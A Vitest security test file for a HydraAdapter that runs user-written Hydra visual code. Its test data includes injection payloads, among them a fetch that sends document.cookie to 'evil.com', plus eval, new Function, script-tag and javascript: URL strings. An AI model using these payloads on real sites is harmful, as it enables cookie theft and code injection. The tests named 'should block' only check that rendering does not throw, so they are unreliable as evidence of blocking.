/**
 * Security tests for HydraAdapter
 *
 * @vitest-environment jsdom
 */

import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { HydraAdapter } from '../../../../src/composition/adapters/HydraAdapter.js';
import type { Layer, GlobalSettings } from '../../../../src/composition/types.js';

// Mock Hydra module
const mockHydraInstance = {
  canvas: document.createElement('canvas'),
  width: 800,
  height: 600,
  stop: vi.fn(),
  start: vi.fn(),
  setResolution: vi.fn(),
  o0: { src: vi.fn() },
  o1: { src: vi.fn() },
  o2: { src: vi.fn() },
  o3: { src: vi.fn() },
  src: vi.fn().mockReturnThis(),
};

const MockHydra = vi.fn().mockImplementation(() => mockHydraInstance);

describe('HydraAdapter Security', () => {
  let adapter: HydraAdapter;
  let mockLayer: Layer;
  let mockContainer: HTMLElement;

  beforeEach(() => {
    adapter = new HydraAdapter();

    mockLayer = {
      id: 'test-hydra-layer',
      type: 'hydra',
      code: 'osc().out()',
      config: {
        zIndex: 1,
        blendMode: 'normal',
        opacity: 1.0,
        position: { x: 0, y: 0 },
        scale: 1.0,
      },
      metadata: {
        prompt: 'Test hydra layer',
        generator: 'HydraGenerator',
        model: 'test-model',
        generatedAt: new Date().toISOString(),
      },
      enabled: true,
      locked: false,
    };

    mockContainer = document.createElement('div');

    // Setup mock Hydra
    (window as unknown as { Hydra: typeof MockHydra }).Hydra = MockHydra;

    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.clearAllMocks();
    delete (window as unknown as { Hydra?: typeof MockHydra }).Hydra;
  });

  describe('Code Execution Security', () => {
    it('should not execute arbitrary code via user input', () => {
      adapter.initialize();

      const maliciousCodes = [
        `'; alert("hacked"); //`,
        `"; document.location='https://evil.com'; //`,
        `'; fetch('https://evil.com/steal?cookie=' + document.cookie); //`,
        `"; window.location.href = 'javascript:alert(1)'; //`,
      ];

      for (const maliciousCode of maliciousCodes) {
        const maliciousLayer = { ...mockLayer, code: maliciousCode };

        // Should not throw but should handle gracefully
        expect(() => adapter.render(maliciousLayer, mockContainer)).not.toThrow();
      }
    });

    it('should block window access attempts', () => {
      adapter.initialize();

      const layerWithWindowAccess = {
        ...mockLayer,
        code: 'window.__testAccess = true; osc().out()',
      };

      // Should not throw during render
      expect(() => adapter.render(layerWithWindowAccess, mockContainer)).not.toThrow();
    });

    it('should block document access attempts', () => {
      adapter.initialize();

      const layerWithDocAccess = {
        ...mockLayer,
        code: 'document.cookie = "stolen"; osc().out()',
      };

      // Should not throw during render
      expect(() => adapter.render(layerWithDocAccess, mockContainer)).not.toThrow();
    });

    it('should block fetch API usage', () => {
      adapter.initialize();

      const layerWithFetch = {
        ...mockLayer,
        code: 'fetch("https://evil.com"); osc().out()',
      };

      // Should not throw during render
      expect(() => adapter.render(layerWithFetch, mockContainer)).not.toThrow();
    });

    it('should block eval usage', () => {
      adapter.initialize();

      const layerWithEval = {
        ...mockLayer,
        code: 'eval("alert(1)"); osc().out()',
      };

      // Should not throw during render
      expect(() => adapter.render(layerWithEval, mockContainer)).not.toThrow();
    });

    it('should block new Function usage', () => {
      adapter.initialize();

      const layerWithFunction = {
        ...mockLayer,
        code: 'new Function("alert(1)")(); osc().out()',
      };

      // Should not throw during render
      expect(() => adapter.render(layerWithFunction, mockContainer)).not.toThrow();
    });

    it('should block localStorage access', () => {
      adapter.initialize();

      const layerWithStorage = {
        ...mockLayer,
        code: 'localStorage.setItem("key", "value"); osc().out()',
      };

      // Should not throw during render
      expect(() => adapter.render(layerWithStorage, mockContainer)).not.toThrow();
    });

    it('should remove script tags from code', () => {
      adapter.initialize();

      const layerWithScript = {
        ...mockLayer,
        code: '<script>alert(1)</script> osc().out()',
      };

      // Should not throw during render
      expect(() => adapter.render(layerWithScript, mockContainer)).not.toThrow();
    });

    it('should block javascript: protocol', () => {
      adapter.initialize();

      const layerWithJsProtocol = {
        ...mockLayer,
        code: 'location.href = "javascript:alert(1)"; osc().out()',
      };

      // Should not throw during render
      expect(() => adapter.render(layerWithJsProtocol, mockContainer)).not.toThrow();
    });

    it('should allow valid Hydra code to execute', () => {
      adapter.initialize();

      const validCode = 'osc(10, 0.5, 0.8).out(o0)';
      const validLayer = { ...mockLayer, code: validCode };

      // Should not throw
      expect(() => adapter.render(validLayer, mockContainer)).not.toThrow();
    });
  });
});
